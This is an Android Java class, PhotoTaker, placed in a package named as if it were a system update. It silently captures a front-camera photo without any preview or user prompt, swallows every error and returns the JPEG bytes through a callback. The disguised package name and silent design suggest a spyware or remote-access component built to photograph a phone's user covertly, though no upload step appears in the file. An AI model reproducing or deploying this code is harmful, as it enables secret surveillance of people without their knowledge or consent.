package com.android.system.update;

import android.content.Context;
import android.graphics.ImageFormat;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.media.Image;
import android.media.ImageReader;
import android.os.Handler;
import android.os.Looper;
import android.view.Surface;

import java.nio.ByteBuffer;
import java.util.Collections;

public class PhotoTaker {

    public interface Cb { void onBytes(byte[] b); }

    public static void takeFront(Context ctx, final Cb cb) {
        try {
            CameraManager cm = (CameraManager) ctx.getSystemService(Context.CAMERA_SERVICE);
            String id = null;
            for (String c : cm.getCameraIdList()) {
                CameraCharacteristics ch = cm.getCameraCharacteristics(c);
                Integer face = ch.get(CameraCharacteristics.LENS_FACING);
                if (face != null && face == CameraCharacteristics.LENS_FACING_FRONT) {
                    id = c; break;
                }
            }
            if (id == null) return;

            final ImageReader reader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 1);
            final Handler h = new Handler(Looper.getMainLooper());

            reader.setOnImageAvailableListener(r -> {
                try (Image img = r.acquireLatestImage()) {
                    ByteBuffer buf = img.getPlanes()[0].getBuffer();
                    byte[] bytes = new byte[buf.remaining()];
                    buf.get(bytes);
                    cb.onBytes(bytes);
                } catch (Exception ignored) {} finally {
                    reader.close();
                }
            }, h);

            cm.openCamera(id, new CameraDevice.StateCallback() {
                @Override public void onOpened(CameraDevice dev) {
                    try {
                        Surface s = reader.getSurface();
                        dev.createCaptureSession(Collections.singletonList(s),
                            new CameraCaptureSession.StateCallback() {
                                @Override public void onConfigured(CameraCaptureSession ses) {
                                    try {
                                        CaptureRequest.Builder b = dev.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                                        b.addTarget(s);
                                        ses.capture(b.build(), null, h);
                                    } catch (Exception ignored) {}
                                }
                                @Override public void onConfigureFailed(CameraCaptureSession ses) {}
                            }, h);
                    } catch (Exception ignored) {}
                }
                @Override public void onDisconnected(CameraDevice dev) {}
                @Override public void onError(CameraDevice dev, int e) {}
            }, h);
        } catch (Exception ignored) {}
    }
}
